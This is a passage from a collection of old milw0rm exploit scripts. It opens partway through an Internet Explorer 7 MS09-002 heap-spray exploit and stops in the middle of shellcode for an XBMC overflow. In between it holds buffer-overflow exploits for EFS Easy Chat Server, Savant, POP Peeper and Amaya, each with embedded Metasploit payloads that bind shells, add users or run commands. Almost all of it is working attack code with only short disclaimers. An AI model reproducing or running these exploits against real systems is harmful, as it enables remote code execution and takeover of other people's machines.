var c = unescape("%ud9db%u74d9%uf424%uc929%u51b1%u02bf%u6c21%u588e%u7831%u8317%u04c0%u7a03%u8e32%u867b%ua55e%u9ec9%uc666%ua12d%ub2f9%u79be%u4fde%ubd7b%u2c95%uc581%u23a8%u7a02%u30b3%ua44a%uadc2%u2f3c%ubaf0%uc1be%u7cc8%ub159%ubdaf%uce2e%uf76e%ud1c2%ue3b2%uea29%ud066%u79f9%u9362%ua5a5%u4f6d%u2e3f%uc461%u6f4b%udb66%u8ca0%u50ba%ufebf%u7ae6%u3da1%u59d7%u4a45%u6e5b%u0c0d%u0550%u9061%u92c5%ua0c2%ucd4b%ufe4c%ue17d%u0101%u9f57%u9bf2%u5330%u0bc7%ue0b6%u9415%uf86c%u428a%ueb46%ua9d7%u0b08%u92f1%u1621%uad98%ud1df%uf867%ue075%ud298%u3de2%u276f%uea5f%u118f%u46f3%uce23%u2ba7%ub390%u5314%u55c6%ubef3%uff9b%u4850%u6a82%uee3e%ue45f%ub978%ud2a0%u56ed%u8f0e%u860e%u8bd8%u095c%u84f0%u8061%u7f51%ufd61%u9a3e%u78d4%u33f7%u5218%uef58%u0eb2%udfa6%ud9a8%ua6bf%u6008%ua717%uc643%u8768%u830a%u41f2%u30bb%u0496%uddde%u4f38%uee08%u8830%uaa20%ub4cb%uf284%u923f%ub019%u1c92%u19a7%u6d7e%u5a52%uc62b%uf208%ue659%u15fc%u6361%ue547%ud04b%u4b10%ub725%u01cf%u66c4%u80a1%u7797%u4391%u5eb5%u5a17%u9f96%u08ce%ua0e6%u33d8%ud5c8%u3070%u2d6a%u371a%uffbb%u171c%u0f2c%u9c68%ubcf2%u4b92%u92f3");

var array = new Array(); 

var ls = 0x100000-(c.length*2+0x01020); 

var b = unescape("%u0C0C%u0C0C"); 
while(b.length<ls/2) { b+=b;} 
var lh = b.substring(0,ls/2); 
delete b; 

for(i=0; i<0xC0; i++) { 
	array[i] = lh + c;
} 

CollectGarbage();

var s1=unescape("%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA");
var a1 = new Array();
for(var x=0;x<1000;x++) a1.push(document.createElement("img"));

function ok() { 
	o1=document.createElement("tbody"); 
	o1.click; 
	var o2 = o1.cloneNode();	
	o1.clearAttributes(); 
	o1=null; CollectGarbage(); 
	for(var x=0;x<a1.length;x++) a1[x].src=s1; 
	o2.click;
}
</script><script>window.setTimeout("ok();",800);</script>""")
       self.wfile.write("""<title>Microsoft Internet Explorer MS09-002 Buffer Overflow</title></head><body>""")
       self.wfile.write("""<left><body bgcolor="Black"><font color="White"><p>Exploit is running...</p><br>""")
       print ("\n\n[-] Exploit sent... [-]\n[-] Wait about 30 seconds and attempt to connect.[-]\n[-]NetCat to IP Address: %s and port 5500 [-]" % (target))
       #print ("[-] Example: open up a command shell and type 'nc %s 5500' [-]" % (target))
  # Print custom HTTP Response
  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header("Content-type", "text/html")
    self.send_header("Server", "myRequestHandler")
    self.end_headers()

 # In case of exceptions, pass them
 except Exception:
    pass
httpd = HTTPServer(('', 80), myRequestHandler)
print ("""
###############################################################################
 
      MS Internet Explorer 7 Memory Corruption Exploit (MS09-002)             				 				 				 				    
###############################################################################
#									      #
# Thanks to Str0ke for finding this in the wild.			      #
#				 				 	      #
# Tested on Windows 2003 SP2 R2 				 	      #
#				 				 	      #
# Written by SecureState R&D Team        			 	      #
# http://www.securestate.com				 		      #
#									      #
# win32_bind EXITFUNC=seh LPORT=5500 Size=314 Encoder=ShikataGaNai Shell=bind #
#									      #
###############################################################################
""")
print ("[-] Starting MS Internet Explorer 7 Memory Corruption Exploit:80 [-]")
print ("[-] Have someone connect to you on port 80 [-]")
print ("Type <control>-c to exit..")
try:
     # handle the connections
     httpd.handle_request()
     # Serve HTTP server forever
     httpd.serve_forever() 
# Except Keyboard Interrupts and throw custom message
except KeyboardInterrupt:
   print ("\n\nExiting exploit...\n\n")
   sys.exit()

# milw0rm.com [2009-02-20]
#!/usr/bin/python
#[*] Bug : 	    EFS Easy Chat Server Authentication Request  Buffer Overflow Exploit (SEH)
#[*] Refer :        http://www.milw0rm.com/exploits/4289
#[*] Tested on :    Xp sp2 (fr)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ)

import struct
import socket



buf = "\x41"*216
buf += "\xEB\x06\xAE\xFA" #jmp+6
buf += "\xB6\xB2\x01\x10" #universal pop pop ret
buf += "\x90"*19

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
buf+=(
	"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa4"
	"\x0d\x2b\xba\x83\xeb\xfc\xe2\xf4\x58\xe5\x6f\xba\xa4\x0d\xa0\xff"
	"\x98\x86\x57\xbf\xdc\x0c\xc4\x31\xeb\x15\xa0\xe5\x84\x0c\xc0\xf3"
	"\x2f\x39\xa0\xbb\x4a\x3c\xeb\x23\x08\x89\xeb\xce\xa3\xcc\xe1\xb7"
	"\xa5\xcf\xc0\x4e\x9f\x59\x0f\xbe\xd1\xe8\xa0\xe5\x80\x0c\xc0\xdc"
	"\x2f\x01\x60\x31\xfb\x11\x2a\x51\x2f\x11\xa0\xbb\x4f\x84\x77\x9e"
	"\xa0\xce\x1a\x7a\xc0\x86\x6b\x8a\x21\xcd\x53\xb6\x2f\x4d\x27\x31"
	"\xd4\x11\x86\x31\xcc\x05\xc0\xb3\x2f\x8d\x9b\xba\xa4\x0d\xa0\xd2"
	"\x98\x52\x1a\x4c\xc4\x5b\xa2\x42\x27\xcd\x50\xea\xcc\xfd\xa1\xbe"
	"\xfb\x65\xb3\x44\x2e\x03\x7c\x45\x43\x6e\x4a\xd6\xc7\x0d\x2b\xba")

head  = "GET /chat.ghp?username="+buf+"&password="+buf+"&room=1 HTTP/1.1\r\n"
head += "Host: 127.0.0.1\r\n"


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',80))
s.send(head + "\r\n\r\n")
s.close()

# milw0rm.com [2009-03-03]
#
#   Author : Ahmed Obied (ahmed.obied@gmail.com)
#
#   - Based on the code found by str0ke in the wild for MS09-002
#   - Tested using Internet Explorer 7.0.5730.11 on Windows XP SP2
#
#   Usage  : python ie_ms09002.py [port]
#       

import sys, socket
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

class RequestHandler(BaseHTTPRequestHandler):

    def get_payload(self):
        # win32_exec - EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub 
        # http://metasploit.com
        payload  = '\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6f'
        payload += '\x02\xb1\x0e\x83\xeb\xfc\xe2\xf4\x93\xea\xf5\x0e\x6f\x02\x3a\x4b'
        payload += '\x53\x89\xcd\x0b\x17\x03\x5e\x85\x20\x1a\x3a\x51\x4f\x03\x5a\x47'
        payload += '\xe4\x36\x3a\x0f\x81\x33\x71\x97\xc3\x86\x71\x7a\x68\xc3\x7b\x03'
        payload += '\x6e\xc0\x5a\xfa\x54\x56\x95\x0a\x1a\xe7\x3a\x51\x4b\x03\x5a\x68'
        payload += '\xe4\x0e\xfa\x85\x30\x1e\xb0\xe5\xe4\x1e\x3a\x0f\x84\x8b\xed\x2a'
        payload += '\x6b\xc1\x80\xce\x0b\x89\xf1\x3e\xea\xc2\xc9\x02\xe4\x42\xbd\x85'
        payload += '\x1f\x1e\x1c\x85\x07\x0a\x5a\x07\xe4\x82\x01\x0e\x6f\x02\x3a\x66'
        payload += '\x53\x5d\x80\xf8\x0f\x54\x38\xf6\xec\xc2\xca\x5e\x07\x7c\x69\xec'
        payload += '\x1c\x6a\x29\xf0\xe5\x0c\xe6\xf1\x88\x61\xd0\x62\x0c\x2c\xd4\x76'
        payload += '\x0a\x02\xb1\x0e';
        return self.convert_to_utf16(payload)
        
    def get_exploit(self):
        exploit = '''
    
        function spray_heap()
        {
            var payload = unescape("<PAYLOAD>");
                        
            var ret = 0x0c0c0c0c;
            var heap_chunk_size = 0x40000;
            
            var nopsled_size = heap_chunk_size - (payload.length * 2)
            var nopsled = unescape("%u0c0c%u0c0c");
            while (nopsled.length < nopsled_size)
                nopsled += nopsled;
                 
            heap_chunks = new Array();
            heap_chunks_num = (ret - heap_chunk_size)/heap_chunk_size;
            for (var i = 0 ; i < heap_chunks_num ; i++)
                heap_chunks[i] = nopsled + payload;
        }
                
        function trigger_bug() 
        {
            var obj = document.createElement("table");
            obj.click;
            
            var obj_cp = obj.cloneNode();
            obj.clearAttributes();
            obj = null;
            
            CollectGarbage();
           
            var img = document.createElement("img");
            img.src = unescape("%u0c0c%u0c0cCCCCCCCCCCCCCCCCCCCCCC");
	        
	        obj_cp.click;
        }
        
        if (navigator.userAgent.indexOf("MSIE 7") != -1) {
            spray_heap();
            trigger_bug()       
        } else
            window.location = "about:blank"
       
        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = '<html><body><script>' + exploit + '</script></body></html>'
        return exploit

    def convert_to_utf16(self, payload):
        # From Beta v2.0 by Berend-Jan Wever
        # http://www.milw0rm.com/exploits/656
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i+j]) & 0xff) << (j*8)
            enc_payload += '%%u%04x' % num
        return enc_payload
            
    def log_request(self, *args, **kwargs):
        pass

    def do_GET(self):
        print '[-] Incoming connection from %s' % self.client_address[0]
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        print '[-] Sending exploit to %s ...' % self.client_address[0],
        self.wfile.write(self.get_exploit())
        print 'done'

def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port]' % sys.argv[0]
        sys.exit(1)
    port = None
    try:
        port = int(sys.argv[1])
        if port < 1 or port > 65535:
            raise ValueError
    except ValueError:
        print '[*] ERROR: invalid port number ...'
        sys.exit(-1)
    try:
        serv = HTTPServer(('', port), RequestHandler)
        ip = socket.gethostbyname(socket.gethostname())
        print '[-] Web server is running at http://%s:%d/' % (ip, port)
    except socket.error:
        print '[*] ERROR: a socket error has occurred ...'
        sys.exit(-1)
    try:
        serv.serve_forever()
    except KeyboardInterrupt:
        print '[-] Exiting ...' 
            
if __name__ == '__main__':
    main()

# milw0rm.com [2009-03-04]
#########################################################
#                                                       #
# Savant web server Buffer Overflow Exploit             #
# Discovered by : Mati Aharoni                          #
# Coded by : Tal Zeltzer and Mati Aharoni               #
# www.see-security.com                                  #
# FOR RESEACRH PURPOSES ONLY!                           #
# FRench Win OS support by Jerome Athias                #
#########################################################
import struct
import socket
sc = "\x90" * 21	#We need this number of nops
# win32_adduser - PASS=pwd EXITFUNC=thread USER=X Size=232 Encoder=PexFnstenvSub http://metasploit.com
sc += "\x31\xc9\x83\xe9\xcc\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
sc += "\x23\x73\xe4\x83\xeb\xfc\xe2\xf4\x24\xcb\x35\xe4\xd8\x23\xf8\xa1"
sc += "\xe4\xa8\x0f\xe1\xa0\x22\x9c\x6f\x97\x3b\xf8\xbb\xf8\x22\x98\x07"
sc += "\xf6\x6a\xf8\xd0\x53\x22\x9d\xd5\x18\xba\xdf\x60\x18\x57\x74\x25"
sc += "\x12\x2e\x72\x26\x33\xd7\x48\xb0\xfc\x27\x06\x07\x53\x7c\x57\xe5"
sc += "\x33\x45\xf8\xe8\x93\xa8\x2c\xf8\xd9\xc8\xf8\xf8\x53\x22\x98\x6d"
sc += "\x84\x07\x77\x27\xe9\xe3\x17\x6f\x98\x13\xf6\x24\xa0\x2c\xf8\xa4"
sc += "\xd4\xa8\x03\xf8\x75\xa8\x1b\xec\x31\x28\x73\xe4\xd8\xa8\x33\xd0"
sc += "\xdd\x5f\x73\xe4\xd8\xa8\x1b\xd8\x87\x12\x85\x84\x8e\xc8\x7e\x8c"
sc += "\x37\xed\x93\x84\xb0\xbb\x8d\x6e\xd6\x74\x8c\x03\x30\xcd\x8c\x1b"
sc += "\x27\x40\x1e\x80\xf6\x46\x0b\x81\xf8\x0c\x10\xc4\xb6\x46\x07\xc4"
sc += "\xad\x50\x16\x96\xf8\x7b\x53\x94\xaf\x47\x53\xcb\x99\x67\x37\xc4"
sc += "\xfe\x05\x53\x8a\xbd\x57\x53\x88\xb7\x40\x12\x88\xbf\x51\x1c\x91"
sc += "\xa8\x03\x32\x80\xb5\x4a\x1d\x8d\xab\x57\x01\x85\xac\x4c\x01\x97"
sc += "\xf8\x7b\x53\xcb\x99\x67\x37\xe4";
sc += "AA"
# Win2k SP0,1,2,3,4 (US...)
#Change Return address as needed
#buf = "\xEB\x19" + " /" + sc + struct.pack("<L",0x750236b2) + "\r\n\r\n"

#0x74FA2AC4		pop esi - pop - ret	ws2help.dll	Win 2K SP4 FR (Found with findjmp2 by Class101 ;)
#buf = "\x90" * 24 + " /" + sc + struct.pack("<L",0x74fa2ac5) + "\r\n\r\n"	#EB becomes CB...? so i changed it by nops

#Win XP SP2 FR?
#0x719E260D		pop esi - pop - ret	ws2help.dll	Win XP SP2 FR (Found with findjmp2 by Class101 ;)
#buf = "\x90" * 24 + " /" + sc + struct.pack("<L",0x719e260e) + "\r\n\r\n"	#EB becomes CB...? so i changed it by nops


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',80))
s.send(buf)
s.close()

# milw0rm.com [2005-02-15]
#!/usr/bin/python
# [+] Bug : POP Peeper 3.4.0.0 (From) Remote Buffer Overflow Exploit (SEH)
# [+] Author : His0k4
# [+] Greetings : All friends and muslims HacKerS (DZ)

from socket import *
import struct


# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x43\x4b\x58\x4e\x37"
"\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x51\x4b\x58"
"\x4f\x55\x42\x42\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x43\x4b\x38"
"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x55\x46\x52\x46\x50\x45\x47\x45\x4e\x4b\x38"
"\x4f\x55\x46\x42\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x44"
"\x4b\x48\x4f\x55\x4e\x51\x41\x50\x4b\x4e\x4b\x38\x4e\x31\x4b\x48"
"\x41\x50\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x33"
"\x42\x4c\x46\x46\x4b\x58\x42\x34\x42\x43\x45\x48\x42\x4c\x4a\x47"
"\x4e\x30\x4b\x48\x42\x44\x4e\x30\x4b\x58\x42\x57\x4e\x51\x4d\x4a"
"\x4b\x48\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x48\x42\x38\x42\x4b"
"\x42\x30\x42\x50\x42\x50\x4b\x38\x4a\x46\x4e\x53\x4f\x45\x41\x53"
"\x48\x4f\x42\x56\x48\x55\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"
"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x30\x4f\x35\x4a\x36\x4a\x39"
"\x50\x4f\x4c\x58\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x56"
"\x4e\x36\x43\x36\x42\x50\x5a")


junk = "\x41"*1989

payload = "\x42"*352
payload += "\xEB\x10\x90\x90" #jmp+10 (tan9iza ta3 10 mitrate :p)
payload += "\x4C\x51\x01\x10" #Universal pop pop ret (Imap.dll)
payload += "\x90"*19          #Nops chriki
payload += shellcode	      #calculatrice ta3 100 da :p


s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 110))
s.listen(1)
print "[*] Listening on [POP3] 110"
c, addr = s.accept()
print "[*] Connection accepted from: %s" % (addr[0])

c.send("+OK\r\n")
c.recv(512)
c.send("+OK\r\n")
c.recv(512)
c.send("+OK\r\n")
c.recv(512)
c.send("+OK 1 100\r\n")
c.recv(512)
c.send("+OK\r\n1 root\r\n.\r\n")
c.recv(512)
c.send("+OK\r\n1 t00r\r\n.\r\n")
c.recv(512)
c.send("+OK 100 octets\r\n")
c.send("To: "+junk+"\r\n.\r\n")
c.send("From: "+payload+"\r\n.\r\n")
c.send("Subject: "+junk+"\r\n.\r\n")
c.send("Date: today\r\n.\r\n")
c.send("Content-Type: "+junk+"; charset=UTF-7\r\n.\r\n")

raw_input("[*] Payload sended!\nPress key to quit")
c.close()
s.close()

# milw0rm.com [2009-03-20]
# exploit.py
#
# Amaya 11.1 W3C Editor/Browser (defer) Stack Overflow Exploit
# By: Encrypt3d.M!nd
#
# Origninal Advisory:
# http://www.milw0rm.com/exploits/8314
#
# Fully Based on Rob Carter's Exploit
# http://www.milw0rm.com/exploits/7988
#
# Note:you need to upload Devil_inside.html to a remote host
# Works with windows xp sp2
#


# metasploit - run calc.exe

shellcode = (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x48\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x63"
"\x58\x30\x41\x30\x50\x41\x6b\x41\x41\x73\x32\x41\x42\x41\x32\x42"
"\x42\x30\x42\x42\x58\x42\x50\x38\x41\x42\x75\x4d\x39\x59\x6c\x4d"
"\x38\x42\x64\x33\x30\x37\x70\x47\x70\x4e\x6b\x52\x65\x65\x6c\x6e"
"\x6b\x41\x6c\x74\x45\x70\x78\x65\x51\x6a\x4f\x6c\x4b\x50\x4f\x74"
"\x58\x4c\x4b\x53\x6f\x55\x70\x46\x61\x4a\x4b\x72\x69\x6e\x6b\x35"
"\x64\x4c\x4b\x35\x51\x48\x6e\x66\x51\x4b\x70\x4a\x39\x6e\x4c\x4e"
"\x64\x4b\x70\x43\x44\x66\x67\x4b\x71\x4b\x7a\x44\x4d\x55\x51\x58"
"\x42\x58\x6b\x6c\x34\x77\x4b\x30\x54\x35\x74\x37\x74\x54\x35\x68"
"\x65\x4e\x6b\x31\x4f\x54\x64\x47\x71\x6a\x4b\x55\x36\x4e\x6b\x76"
"\x6c\x30\x4b\x4e\x6b\x51\x4f\x55\x4c\x35\x51\x7a\x4b\x4e\x6b\x45"
"\x4c\x4c\x4b\x46\x61\x48\x6b\x4f\x79\x53\x6c\x36\x44\x54\x44\x79"
"\x53\x30\x31\x6f\x30\x50\x64\x4c\x4b\x33\x70\x46\x50\x4f\x75\x6f"
"\x30\x70\x78\x34\x4c\x4e\x6b\x57\x30\x66\x6c\x4e\x6b\x50\x70\x35"
"\x4c\x4e\x4d\x6e\x6b\x52\x48\x53\x38\x4a\x4b\x53\x39\x4c\x4b\x4f"
"\x70\x6e\x50\x35\x50\x55\x50\x53\x30\x6e\x6b\x53\x58\x57\x4c\x53"
"\x6f\x74\x71\x7a\x56\x51\x70\x70\x56\x6f\x79\x39\x68\x4c\x43\x69"
"\x50\x43\x4b\x30\x50\x71\x78\x78\x70\x4f\x7a\x37\x74\x73\x6f\x75"
"\x38\x6c\x58\x6b\x4e\x4f\x7a\x56\x6e\x73\x67\x79\x6f\x4b\x57\x35"
"\x33\x35\x31\x32\x4c\x45\x33\x47\x70\x63")


chars = "\x41" * 6887
chars+= "\x74\x06\x41\x41"	        # jmp short 06
chars+= "\x17\x19\x10\x02"	        # 0x02101917 - pop pop ret in amaya module
chars+= "\x68\x7f\x01\x01\x7f"		# push 7f01017f
chars+= "\x58"				# pop eax
chars+= "\x2d\x18\x69\x45\x7d"		# sub eax,7a7a0857
chars+= "\x50"				# push eax
chars+= "\xc3"				# retn
chars+= "\x90" * 100
chars+=shellcode

header= ('<script defer="'+chars+'">')

file=open('Devil_inside.html','w')
file.write(header)
file.close()

# milw0rm.com [2009-03-30]
#!/usr/bin/env python 
'''
Xbmc get request remote buffer overflow 8.10 !!! 
 
Tested:Win xp sp2 eng
Vendor url:http://xbmc.org/ 
Release date:April the 1st 2009

versions affected: 
Linux windows < tested 
other versions are also possibly affected. 
 
Restrictions:Bad chars need to be filtered. 
 
This exploit happens when parsing and overly long 
get request.We can gain control of the $eip register 
the next 4bytes of our user supplied data is copied into 
$esp register. 
 
The 3 buffer overflows i found in xbmc have nothing in 
common they are 3 separate overflow.Please see poc code 
for further analysis. 
 
I tried to evade the filtering when passing the shell code 
by loading it into the other fields that where available. 
 
We are able to overwrite the exception handlers also so 
creating a reliable exploit for vista and xps3 shouldn't 
be to hard have a look there are some modules loaded with 
out /safe seh. 
 
Credits to n00b for finding the buffer overflow and writing 
poc code and exploit.

----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.

I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!

'''

import sys, socket 
import struct

port = 80 
host = sys.argv[1] 
Junk_buffer = 'A'*1010
Jump_esp = struct.pack('<L',0x77F84143)

Shell_code=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x54\x4e\x33\x4b\x38\x4e\x57"
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x41\x4b\x38"
"\x4f\x35\x42\x42\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x58"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"
"\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x54"
"\x4b\x58\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"
"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x53"
"\x42\x4c\x46\x46\x4b\x48\x42\x44\x42\x43\x45\x38\x42\x4c\x4a\x37"
"\x4e\x50\x4b\x48\x42\x44\x4e\x50\x4b\x48\x42\x57\x4e\x51\x4d\x4a"
"\x4b\x48\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x58\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x46\x4e\x43\x4f\x55\x41\x43"
"\x48\x4f\x42\x56\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x55\x4a\x46\x4f\x4e\x50\x4c\x42\x4e\x42\x46\x4a\x36\x4a\x49"
"\x50\x4f\x4c\x48\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x46\x41\x56"
"\x4e\x46\x43\x56\x50\x42\x45\x56\x4a\x37\x45\x36\x42\x30\x5a"
)
# create a socket object called 'c' 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# connect to the socket 
c.connect((host, port)) 

Request = (Junk_buffer + Jump_esp + Shell_code)

# create a file-like object to read 
fileobj = c.makefile('r', 0) 

# Ask the server for the file 
fileobj.write("GET /"+Request+" HTTP/1.1\n\n") 

# milw0rm.com [2009-04-01]
#!/usr/bin/env python 
'''
Xbmc takescreenshot request remote buffer overflow 8.10 !!! 
 
Tested:Win xp sp2 eng 
Vendor url:http://xbmc.org/ 
Release date:April the 1st 2009
 
versions affected: 
Linux windows < tested 
other versions are also possibly affected. 
 
Restrictions:No restrictions 

This exploit happens when parsing and overly long file name
to the server using the takescreenshot command.
there is a description in the poc code.

When passing this to the http server we can evade url: filtering
as it is passed to the application as an overly long dir.
This means we can use any shell code we wish.

We are able to overwrite the exception handlers also so 
creating a reliable exploit for vista and xps3 shouldn't 
be to hard have a look there are some modules loaded with 
out /safe seh. 

Credits to n00b for finding the buffer overflow and writing 
poc code and exploit.

----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.

I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!
'''

import sys, socket 
import struct

port = 80 
host = sys.argv[1] 

Start_url ='xbmcCmds/xbmcHttp?command=takescreenshot('
Junk_buffer = 'A'*1036
Jump_esp = struct.pack('<L',0x77F84143)

Shell_code=(#win32_bind -EXITFUNC=seh LPORT=4444 http://metasploit.com */
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
"\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
"\x4e\x36\x46\x32\x46\x32\x4b\x48\x45\x34\x4e\x53\x4b\x58\x4e\x37"
"\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x51\x4b\x58"
"\x4f\x45\x42\x52\x41\x30\x4b\x4e\x49\x44\x4b\x48\x46\x33\x4b\x58"
"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x35\x46\x32\x4a\x32\x45\x47\x45\x4e\x4b\x48"
"\x4f\x55\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x58\x4e\x50\x4b\x54"
"\x4b\x48\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x43\x50\x4e\x32\x4b\x38"
"\x49\x48\x4e\x36\x46\x32\x4e\x31\x41\x36\x43\x4c\x41\x53\x4b\x4d"
"\x46\x46\x4b\x48\x43\x44\x42\x53\x4b\x38\x42\x34\x4e\x30\x4b\x38"
"\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x34\x4a\x50\x50\x45\x4a\x36"
"\x50\x58\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
"\x43\x35\x48\x36\x4a\x46\x43\x33\x44\x53\x4a\x46\x47\x37\x43\x37"
"\x44\x53\x4f\x45\x46\x55\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x33\x42\x35\x4f\x4f\x48\x4d\x4f\x55\x49\x38\x45\x4e"
"\x48\x56\x41\x48\x4d\x4e\x4a\x30\x44\x30\x45\x45\x4c\x36\x44\x50"
"\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x35"
"\x4f\x4f\x48\x4d\x43\x35\x43\x55\x43\x55\x43\x55\x43\x55\x43\x34"
"\x43\x35\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x56\x4a\x46\x41\x51"
"\x4e\x45\x48\x36\x43\x35\x49\x58\x41\x4e\x45\x59\x4a\x46\x46\x4a"
"\x4c\x51\x42\x47\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x41"
"\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x52"
"\x49\x4e\x47\x55\x4f\x4f\x48\x4d\x43\x45\x45\x45\x4f\x4f\x42\x4d"
"\x4a\x46\x45\x4e\x49\x44\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
"\x42\x35\x46\x45\x46\x35\x45\x55\x4f\x4f\x42\x4d\x43\x39\x4a\x46"
"\x47\x4e\x49\x57\x48\x4c\x49\x47\x47\x55\x4f\x4f\x48\x4d\x45\x45"
"\x4f\x4f\x42\x4d\x48\x46\x4c\x46\x46\x56\x48\x56\x4a\x36\x43\x46"
"\x4d\x56\x49\x48\x45\x4e\x4c\x46\x42\x35\x49\x35\x49\x32\x4e\x4c"
"\x49\x48\x47\x4e\x4c\x56\x46\x54\x49\x48\x44\x4e\x41\x53\x42\x4c"
